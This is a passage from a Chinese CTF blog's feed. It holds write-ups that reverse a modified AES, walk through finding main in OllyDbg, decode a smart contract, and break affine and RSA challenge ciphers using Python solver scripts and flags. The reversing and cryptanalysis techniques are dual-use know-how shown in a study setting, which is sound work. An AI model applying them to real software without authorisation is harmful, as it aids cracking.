class="number">0x49</span>, <span class="number">0xF2</span>, <span class="number">0xD7</span>, <span class="number">0xE0</span>, <span class="number">0x5F</span>, <span class="number">0x47</span>, <span class="number">0xAC</span>, <span class="number">0x71</span>, <span class="number">0x90</span>, <span class="number">0xD8</span>, <span class="number">0x48</span>, <span class="number">0x0D</span>, <span class="number">0xAE</span>, <span class="number">0x15</span>, <span class="number">0xE2</span>, <span class="number">0xAE</span>, <span class="number">0xE7</span>, <span class="number">0xD5</span>, <span class="number">0xCC</span>, <span class="number">0x29</span>, <span class="number">0x03</span>, <span class="number">0x92</span>, <span class="number">0x60</span>, <span class="number">0x58</span>, <span class="number">0x93</span>, <span class="number">0x4A</span>, <span class="number">0x28</span>, <span class="number">0x55</span>, <span class="number">0x3D</span>, <span class="number">0x5F</span>, <span class="number">0xCA</span>, <span class="number">0xFB</span>, <span class="number">0xDA</span>, <span class="number">0x79</span>, <span class="number">0xCF</span>, <span class="number">0xD9</span>, <span class="number">0x07</span>, <span class="number">0xEB</span>, <span class="number">0xAF</span>, <span class="number">0x81</span>, <span class="number">0x94</span>, <span class="number">0xA1</span>, <span class="number">0x87</span>, <span class="number">0xD4</span>, <span class="number">0xA9</span>, <span class="number">0xFE</span>, <span class="number">0x4D</span>, <span class="number">0x2F</span>, <span class="number">0x73</span>, <span class="number">0x56</span>, <span class="number">0x36</span>, <span class="number">0xE5</span>, <span class="number">0x01</span>, <span class="number">0xBD</span>, <span class="number">0x99</span>, <span class="number">0x64</span>, <span class="number">0x95</span>, <span class="number">0x1C</span>, <span class="number">0x1E</span>, <span class="number">0xB0</span>, <span class="number">0x3C</span>, <span class="number">0xE2</span>, <span class="number">0x53</span>, <span class="number">0x9F</span>, <span class="number">0x4F</span>, <span class="number">0x13</span>, <span class="number">0x2E</span>, <span class="number">0x2F</span>, <span class="number">0x26</span>, <span class="number">0xAE</span>, <span class="number">0xB7</span>, <span class="number">0x4B</span>, <span class="number">0xB3</span>, <span class="number">0xB2</span>, <span class="number">0xA9</span>, <span class="number">0xFB</span>, <span class="number">0x8F</span>, <span class="number">0x50</span>, <span class="number">0xFA</span>, <span class="number">0x64</span>, <span class="number">0xC0</span>, <span class="number">0x85</span>, <span class="number">0xE8</span>, <span class="number">0x33</span>, <span class="number">0x8D</span>, <span class="number">0x2B</span>, <span class="number">0x5F</span>, <span class="number">0x78</span>, <span class="number">0x3E</span>, <span class="number">0x99</span>, <span class="number">0xF6</span>, <span class="number">0x83</span>, <span class="number">0xB1</span>, <span class="number">0xC9</span>, <span class="number">0x0C</span>, <span class="number">0xE7</span>, <span class="number">0x71</span>, <span class="number">0x04</span>, <span class="number">0x21</span>, <span class="number">0x0D</span>, <span class="number">0x43</span>, <span class="number">0x2F</span>, <span class="number">0x7E</span>, <span class="number">0x75</span>, <span class="number">0x7D</span>, <span class="number">0xB6</span>, <span class="number">0x88</span>, <span class="number">0xF6</span>, <span class="number">0xCC</span>, <span class="number">0x7F</span>, <span class="number">0x84</span>, <span class="number">0x11</span>, <span class="number">0xBD</span>, <span class="number">0x24</span>, <span class="number">0x6F</span>, <span class="number">0x4F</span>, <span class="number">0xD7</span>, <span class="number">0x0B</span>, <span class="number">0x11</span>, <span class="number">0x3A</span>, <span class="number">0xAA</span>, <span class="number">0xBD</span>, <span class="number">0x99</span>, <span class="number">0xCC</span>, <span class="number">0x66</span>, <span class="number">0xC2</span>, <span class="number">0x1D</span>, <span class="number">0xDD</span>, <span class="number">0xDB</span>, <span class="number">0x69</span>, <span class="number">0xAF</span>, <span class="number">0xC3</span>, <span class="number">0x88</span>, <span class="number">0x62</span>, <span class="number">0xBE</span>, <span class="number">0xF9</span>, <span class="number">0x22</span>, <span class="number">0xDF</span>, <span class="number">0x27</span>, <span class="number">0x35</span>, <span class="number">0x44</span>, <span class="number">0x1D</span>, <span class="number">0x3A</span>, <span class="number">0xE8</span>, <span class="number">0x9F</span>, <span class="number">0x61</span>, <span class="number">0x70</span>, <span class="number">0xDB</span>, <span class="number">0xC5</span>, <span class="number">0x03</span>, <span class="number">0xCE</span>, <span class="number">0x22</span>, <span class="number">0xE7</span>, <span class="number">0xDC</span>, <span class="number">0xE9</span>, <span class="number">0x17</span>, <span class="number">0xA3</span>, <span class="number">0xC1</span>, <span class="number">0xD3</span>, <span class="number">0xFF</span>, <span class="number">0x3C</span>, <span class="number">0x02</span>]</span><br><span class="line">SBOX = [<span class="number">0x28</span>, <span class="number">0x90</span>, <span class="number">0xC3</span>, <span class="number">0x41</span>, <span class="number">0xC2</span>, <span class="number">0x75</span>, <span class="number">0x84</span>, <span class="number">0xDA</span>, <span class="number">0x79</span>, <span class="number">0xE7</span>, <span class="number">0x21</span>, <span class="number">0x0C</span>, <span class="number">0x81</span>, <span class="number">0xD5</span>, <span class="number">0xBF</span>, <span class="number">0x92</span>, <span class="number">0xB8</span>, <span class="number">0x4E</span>, <span class="number">0xB1</span>, <span class="number">0x2D</span>, <span class="number">0xED</span>, <span class="number">0x5C</span>, <span class="number">0xCB</span>, <span class="number">0x99</span>, <span class="number">0x6A</span>, <span class="number">0x32</span>, <span class="number">0x6F</span>, <span class="number">0xF2</span>, <span class="number">0x52</span>, <span class="number">0x4D</span>, <span class="number">0x29</span>, <span class="number">0x77</span>, <span class="number">0x49</span>, <span class="number">0x1D</span>, <span class="number">0xBB</span>, <span class="number">0x3A</span>, <span class="number">0x9F</span>, <span class="number">0x02</span>, <span class="number">0x1A</span>, <span class="number">0x71</span>, <span class="number">0x58</span>, <span class="number">0x72</span>, <span class="number">0xBA</span>, <span class="number">0xA1</span>, <span class="number">0x5E</span>, <span class="number">0xFA</span>, <span class="number">0x48</span>, <span class="number">0xF9</span>, <span class="number">0xFC</span>, <span class="number">0xF7</span>, <span class="number">0xA6</span>, <span class="number">0x97</span>, <span class="number">0x9D</span>, <span class="number">0x24</span>, <span class="number">0x0D</span>, <span class="number">0xE0</span>, <span class="number">0xF3</span>, <span class="number">0x37</span>, <span class="number">0x08</span>, <span class="number">0xEA</span>, <span class="number">0xF5</span>, <span class="number">0x6B</span>, <span class="number">0x86</span>, <span class="number">0xEF</span>, <span class="number">0x8D</span>, <span class="number">0x61</span>, <span class="number">0x65</span>, <span class="number">0x17</span>, <span class="number">0xD7</span>, <span class="number">0x7E</span>, <span class="number">0x13</span>, <span class="number">0x9C</span>, <span class="number">0xCC</span>, <span class="number">0x12</span>, <span class="number">0x33</span>, <span class="number">0x8E</span>, <span class="number">0x7D</span>, <span class="number">0x2F</span>, <span class="number">0x55</span>, <span class="number">0xCA</span>, <span class="number">0xAB</span>, <span class="number">0xE4</span>, <span class="number">0xFE</span>, <span class="number">0x45</span>, <span class="number">0xD6</span>, <span class="number">0xF6</span>, <span class="number">0xDE</span>, <span class="number">0xF1</span>, <span class="number">0x67</span>, <span class="number">0xE1</span>, <span class="number">0x0B</span>, <span class="number">0xB2</span>, <span class="number">0xAE</span>, <span class="number">0xCF</span>, <span class="number">0x7C</span>, <span class="number">0x04</span>, <span class="number">0x0E</span>, <span class="number">0x16</span>, <span class="number">0xA2</span>, <span class="number">0x00</span>, <span class="number">0xC6</span>, <span class="number">0xFF</span>, <span class="number">0x2C</span>, <span class="number">0x1E</span>, <span class="number">0x47</span>, <span class="number">0x30</span>, <span class="number">0xA4</span>, <span class="number">0x40</span>, <span class="number">0x4B</span>, <span class="number">0x15</span>, <span class="number">0x38</span>, <span class="number">0x35</span>, <span class="number">0xAF</span>, <span class="number">0x3E</span>, <span class="number">0x39</span>, <span class="number">0x3C</span>, <span class="number">0xD2</span>, <span class="number">0x85</span>, <span class="number">0xC7</span>, <span class="number">0x64</span>, <span class="number">0x89</span>, <span class="number">0xFD</span>, <span class="number">0xE8</span>, <span class="number">0x8B</span>, <span class="number">0x43</span>, <span class="number">0xC8</span>, <span class="number">0x22</span>, <span class="number">0x94</span>, <span class="number">0xA8</span>, <span class="number">0x31</span>, <span class="number">0xA3</span>, <span class="number">0xB9</span>, <span class="number">0x20</span>, <span class="number">0xEB</span>, <span class="number">0xB0</span>, <span class="number">0x01</span>, <span class="number">0x3D</span>, <span class="number">0x68</span>, <span class="number">0x5A</span>, <span class="number">0x93</span>, <span class="number">0x5B</span>, <span class="number">0x4F</span>, <span class="number">0x50</span>, <span class="number">0xE6</span>, <span class="number">0x6D</span>, <span class="number">0xF4</span>, <span class="number">0x44</span>, <span class="number">0x10</span>, <span class="number">0x80</span>, <span class="number">0xA7</span>, <span class="number">0x51</span>, <span class="number">0xD3</span>, <span class="number">0xC4</span>, <span class="number">0x2B</span>, <span class="number">0x88</span>, <span class="number">0x95</span>, <span class="number">0xA5</span>, <span class="number">0x70</span>, <span class="number">0x23</span>, <span class="number">0x18</span>, <span class="number">0x09</span>, <span class="number">0x4A</span>, <span class="number">0x19</span>, <span class="number">0x66</span>, <span class="number">0xDC</span>, <span class="number">0xEC</span>, <span class="number">0x14</span>, <span class="number">0xA9</span>, <span class="number">0xDB</span>, <span class="number">0xE2</span>, <span class="number">0x91</span>, <span class="number">0x4C</span>, <span class="number">0x57</span>, <span class="number">0x82</span>, <span class="number">0x1B</span>, <span class="number">0x2A</span>, <span class="number">0x11</span>, <span class="number">0x7B</span>, <span class="number">0x5D</span>, <span class="number">0x8A</span>, <span class="number">0xD4</span>, <span class="number">0xA0</span>, <span class="number">0x07</span>, <span class="number">0xD8</span>, <span class="number">0x53</span>, <span class="number">0x9B</span>, <span class="number">0x26</span>, <span class="number">0xD1</span>, <span class="number">0x98</span>, <span class="number">0x42</span>, <span class="number">0x0A</span>, <span class="number">0x9A</span>, <span class="number">0x1C</span>, <span class="number">0x8F</span>, <span class="number">0x5F</span>, <span class="number">0x63</span>, <span class="number">0xE9</span>, <span class="number">0xCD</span>, <span class="number">0xC1</span>, <span class="number">0x1F</span>, <span class="number">0x6C</span>, <span class="number">0xCE</span>, <span class="number">0xAC</span>, <span class="number">0xAA</span>, <span class="number">0xD0</span>, <span class="number">0x7F</span>, <span class="number">0x59</span>, <span class="number">0xBE</span>, <span class="number">0xB6</span>, <span class="number">0x46</span>, <span class="number">0xB7</span>, <span class="number">0x83</span>, <span class="number">0xEE</span>, <span class="number">0x7A</span>, <span class="number">0x9E</span>, <span class="number">0xC5</span>, <span class="number">0x62</span>, <span class="number">0x60</span>, <span class="number">0xF0</span>, <span class="number">0x8C</span>, <span class="number">0x2E</span>, <span class="number">0xC0</span>, <span class="number">0xDD</span>, <span class="number">0x73</span>, <span class="number">0x56</span>, <span class="number">0x76</span>, <span class="number">0x27</span>, <span class="number">0xB5</span>, <span class="number">0x25</span>, <span class="number">0x74</span>, <span class="number">0x6E</span>, <span class="number">0xC9</span>, <span class="number">0xDF</span>, <span class="number">0xB4</span>, <span class="number">0x34</span>, <span class="number">0x05</span>, <span class="number">0xD9</span>, <span class="number">0xB3</span>, <span class="number">0xBD</span>, <span class="number">0x3B</span>, <span class="number">0x54</span>, <span class="number">0xAD</span>, <span class="number">0x0F</span>, <span class="number">0x87</span>, <span class="number">0x78</span>, <span class="number">0xFB</span>, <span class="number">0x69</span>, <span class="number">0xF8</span>, <span class="number">0xBC</span>, <span class="number">0xE3</span>, <span class="number">0x96</span>, <span class="number">0x03</span>, <span class="number">0x3F</span>, <span class="number">0xE5</span>, <span class="number">0x06</span>, <span class="number">0x36</span>]</span><br><span class="line">key = [<span class="built_in">bytearray</span>(<span class="string">b&quot;vMBixpswDVgJhpZd&quot;</span>),[a1[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)],[a1[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>,<span class="number">32</span>)]]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">21</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">        row_re(i)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i*<span class="number">16</span>,(i+<span class="number">1</span>)*<span class="number">16</span>):</span><br><span class="line">            a1[j] = SBOX.index(a1[j])</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            a1[i*<span class="number">16</span>+k] ^= key_t[p*<span class="number">16</span> + k]</span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            a1[l+<span class="number">16</span>*i] ^= key[i][l]</span><br><span class="line"><span class="built_in">bytearray</span>(a1)</span><br><span class="line"><span class="comment"># SYC&#123;ZtZJpWvEthTkaDzLQznEYLybEcNOPfmlukmZbzXBhih&#125;</span></span><br></pre></td></tr></table></figure><h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
    
    
    <summary type="html">&lt;p&gt;emmmmmmmmmmm,第一次做到魔改aes，有点激动记录一下吧&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="https://pa1r0t.github.io/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>re_base1</title>
    <link href="https://pa1r0t.github.io/2022/12/17/re-base1/"/>
    <id>https://pa1r0t.github.io/2022/12/17/re-base1/</id>
    <published>2022-12-17T13:16:25.000Z</published>
    <updated>2022-12-17T13:36:34.076Z</updated>
    
    <content type="html"><![CDATA[<p>re_OD debugger1</p><span id="more"></span><h1 id="查找main函数的五种方法"><a href="#查找main函数的五种方法" class="headerlink" title="查找main函数的五种方法"></a>查找main函数的五种方法</h1><p>运行程序，看见弹窗，盲猜是user32.GetmessageW()的api</p><p><img src="/./../images/image-20221217212124141.png" alt="image-20221217212124141"></p><p>方法一：</p><p>1.不断地F7步入函数</p><p>2.看见一些红色api，即一些库函数，就Ctrl+F9跳出此函数</p><p><img src="/./../images/image-20221217212358112.png" alt="image-20221217212358112"></p><p>3.直到看见弹窗函数</p><p>方法二：</p><p>1.不断地F8步过函数</p><p>2.直到某个函数执行了弹窗函数，然后在此函数之上下断，然后ctrl+F2重新开始</p><p>3.直到找到弹窗函数</p><p>方法三：</p><p>1.通过查找api的方式查找main函数</p><p>2.右键查看模块间的调用函数</p><p><img src="/./../images/image-20221217212828911.png" alt="image-20221217212828911"></p><p>3.找到弹窗函数即可</p><p>方法四：</p><p>1.Ctrl+n查找所有内存的api</p><p><img src="/./../images/image-20221217213116702.png" alt="image-20221217213116702"></p><p>方法五：</p><p>1.查找字符串,右键即可</p><p>这里修改dump窗口的数据，选中数据后摁ctrl+E</p><p><img src="/./../images/image-20221217213430348.png" alt="image-20221217213430348"></p><p>修改后右键复制到文件</p><p><img src="/./../images/image-20221217213520134.png" alt="image-20221217213520134"></p><p>在dump窗口中，右键保存文件即可</p><p><img src="/./../images/image-20221217213618822.png" alt="image-20221217213618822"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;re_OD debugger1&lt;/p&gt;</summary>
    
    
    
    <category term="re" scheme="https://pa1r0t.github.io/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>信创网安wp</title>
    <link href="https://pa1r0t.github.io/2022/12/05/%E4%BF%A1%E5%88%9B%E7%BD%91%E5%AE%89wp/"/>
    <id>https://pa1r0t.github.io/2022/12/05/%E4%BF%A1%E5%88%9B%E7%BD%91%E5%AE%89wp/</id>
    <published>2022-12-05T02:42:19.000Z</published>
    <updated>2022-12-05T03:12:44.452Z</updated>
    
    <content type="html"><![CDATA[<p>省排名：22</p><p>web师傅纠结于web最后一题，所以杂项一道没做。然后我把仿射密码的做题思路给忘了，然后密码0解，至于pwn….</p><span id="more"></span><h1 id="RevShift"><a href="#RevShift" class="headerlink" title="RevShift"></a>RevShift</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">&#x27;≁⧃⩆㷕⿤ᩣᡤ㋟㩨ᣳ⿃ᣰ㑥㥟⫴㍽&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(str1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str1:</span><br><span class="line">    t = <span class="built_in">ord</span>(i)&amp;<span class="number">0xff</span></span><br><span class="line">    <span class="keyword">if</span> t &gt; <span class="number">128</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(i) &gt;&gt; <span class="number">7</span>)+<span class="built_in">chr</span>((<span class="built_in">ord</span>(i)-<span class="number">128</span>)&amp;<span class="number">0xff</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(i) &gt;&gt; <span class="number">7</span>)+<span class="built_in">chr</span>((<span class="built_in">ord</span>(i))&amp;<span class="number">0xff</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">f.close()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(<span class="string">&#x27;10000000&#x27;</span>,<span class="number">2</span>))</span><br><span class="line"><span class="comment"># DASCTF&#123;U_d4c0de_th1s_C1pher_Utf&#125;</span></span><br></pre></td></tr></table></figure><h1 id="ReContract"><a href="#ReContract" class="headerlink" title="ReContract"></a>ReContract</h1><h5 id="1-智能合约的题，我也是第一次做，但提示说是一道容易题，查看文件发现前面有几个数字缺了，直接百度搜着找就行"><a href="#1-智能合约的题，我也是第一次做，但提示说是一道容易题，查看文件发现前面有几个数字缺了，直接百度搜着找就行" class="headerlink" title="1.智能合约的题，我也是第一次做，但提示说是一道容易题，查看文件发现前面有几个数字缺了，直接百度搜着找就行"></a>1.智能合约的题，我也是第一次做，但提示说是一道容易题，查看文件发现前面有几个数字缺了，直接百度搜着找就行<img src="/./../images/image-20221205105400376.png" alt="image-20221205105400376"></h5><h5 id="2-然后又找到一篇文章，上面写着一个在线工具"><a href="#2-然后又找到一篇文章，上面写着一个在线工具" class="headerlink" title="2.然后又找到一篇文章，上面写着一个在线工具"></a>2.然后又找到一篇文章，上面写着一个在线工具<img src="/./../images/image-20221205105528927.png" alt="image-20221205105528927"></h5><h5 id="3-直接将字节码复制进去翻译即可"><a href="#3-直接将字节码复制进去翻译即可" class="headerlink" title="3.直接将字节码复制进去翻译即可"></a>3.直接将字节码复制进去翻译即可<img src="/./../images/image-20221205105705533.png" alt="image-20221205105705533"></h5><h5 id="4-这里看见有五个可疑数字，拿去转字符串看看"><a href="#4-这里看见有五个可疑数字，拿去转字符串看看" class="headerlink" title="4.这里看见有五个可疑数字，拿去转字符串看看"></a>4.这里看见有五个可疑数字，拿去转字符串看看<img src="/./../images/image-20221205105820247.png" alt="image-20221205105820247"></h5><h5 id="5-发现顺序是乱的，以我神级英语水平，大概的顺序就是-’反编译智能合约字节码真的不错’-hhhhhhhhhhhh"><a href="#5-发现顺序是乱的，以我神级英语水平，大概的顺序就是-’反编译智能合约字节码真的不错’-hhhhhhhhhhhh" class="headerlink" title="5.发现顺序是乱的，以我神级英语水平，大概的顺序就是:’反编译智能合约字节码真的不错’,hhhhhhhhhhhh"></a>5.发现顺序是乱的，以我神级英语水平，大概的顺序就是:’反编译智能合约字节码真的不错’,hhhhhhhhhhhh<img src="/./../images/image-20221205110022973.png" alt="image-20221205110022973"></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="number">0x4279746563306465355f00000000000000000000000000000000000000000000</span>))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="number">0x4441534354467b00000000000000000000000000000000000000000000000000</span>))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="number">0x536d3472745f43306e74724063745f0000000000000000000000000000000000</span>))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="number">0x443363306d70316c655f00000000000000000000000000000000000000000000</span>))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="number">0x31735f46756e4e792e7d00000000000000000000000000000000000000000000</span>))</span><br><span class="line"><span class="comment"># DASCTF&#123;D3c0mp1le_Sm4rt_C0ntr@ct_Bytec0de5_1s_FunNy.&#125;</span></span><br></pre></td></tr></table></figure><hr><p>赛后复现密码—–逆向第三道懒得复现，还有密码第三道。。。。。。&#x3D;&#x3D;看了一遍代码就把文件扔到回收站了&#x3D;&#x3D;</p><h1 id="easy-Affline"><a href="#easy-Affline" class="headerlink" title="easy_Affline"></a>easy_Affline</h1><p>这道题题目给的a，b数字太大，我以为要爆破很长的区间，其实不用，经过我脚本的测试，发现大数字和小数字的结果是相同的，所以只需遍历0~m即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">text = <span class="string">&#x27;aCdhpnlmNKuRJbfVIXUvyTrSPqjBMzgwHZkAxWGiYetEsocDLFOQ&#x27;</span></span><br><span class="line">cipher = <span class="string">&#x27;CezmBh&#123;BKDdD_oP_rKD_rdtF_cMHu&#125;&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;DASCTF&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">d</span>():</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">52</span>):</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">52</span>):</span><br><span class="line">            <span class="keyword">if</span> GCD(a,<span class="number">52</span>) == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            c = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            t = inverse(a,<span class="number">52</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">                x = text.find(i)</span><br><span class="line">                c += text[t*(x-b) % <span class="built_in">len</span>(text)]</span><br><span class="line">            <span class="keyword">if</span> c == flag:</span><br><span class="line">                <span class="built_in">print</span>(a,b)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">        </span><br><span class="line">d()</span><br><span class="line">a = <span class="number">2</span></span><br><span class="line">b = <span class="number">6</span></span><br><span class="line">t = inverse(a,<span class="number">52</span>)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> text:</span><br><span class="line">            flag += i</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x = text.find(i)</span><br><span class="line">            flag += text[t*(x-b) % <span class="built_in">len</span>(text)]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># DASCTF&#123;TheLe_iU_Ihe_ILxE_Yrjp&#125;</span></span><br></pre></td></tr></table></figure><h1 id="gauss-system"><a href="#gauss-system" class="headerlink" title="gauss_system"></a>gauss_system</h1><p>sage解即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">k = <span class="number">1751007263671615053487807501173970925758538</span></span><br><span class="line">c = <span class="number">463982900309034681135307002234842926080979</span></span><br><span class="line">p, q = var(<span class="string">&quot;p, q&quot;</span>)</span><br><span class="line">assume(p, <span class="string">&quot;integer&quot;</span>)</span><br><span class="line">assume(q, <span class="string">&quot;integer&quot;</span>)</span><br><span class="line">sol = solve((p - <span class="number">1003</span>) ** <span class="number">2</span> + (q - <span class="number">48</span>) ** <span class="number">2</span> == k, p, q)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> p, q <span class="keyword">in</span> sol:</span><br><span class="line">    <span class="keyword">if</span> p &gt; <span class="number">0</span> <span class="keyword">and</span> q &gt; <span class="number">0</span>:</span><br><span class="line">        p, q = <span class="built_in">int</span>(p), <span class="built_in">int</span>(q)</span><br><span class="line">        <span class="keyword">if</span> is_prime(p) <span class="keyword">and</span> is_prime(q):</span><br><span class="line">            <span class="built_in">print</span>(p)</span><br><span class="line">            <span class="built_in">print</span>(q)</span><br></pre></td></tr></table></figure><p><img src="/./../images/image-20221205111022196.png" alt="image-20221205111022196"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">s = <span class="number">1751007263671615053487807501173970925758538</span></span><br><span class="line">c = <span class="number">463982900309034681135307002234842926080979</span></span><br><span class="line">p = <span class="number">1087638045546779918273</span></span><br><span class="line">q = <span class="number">753691412682137267747</span></span><br><span class="line"><span class="keyword">assert</span> p**<span class="number">2</span> + q**<span class="number">2</span> == s</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = libnum.invmod(e,phi)</span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">long_to_bytes(m)</span><br><span class="line"><span class="comment"># Z[i]_15_m4g1c</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;省排名：22&lt;/p&gt;
&lt;p&gt;web师傅纠结于web最后一题，所以杂项一道没做。然后我把仿射密码的做题思路给忘了，然后密码0解，至于pwn….&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="https://pa1r0t.github.io/categories/ctf/"/>
    
    
  </entry>
  
</feed>
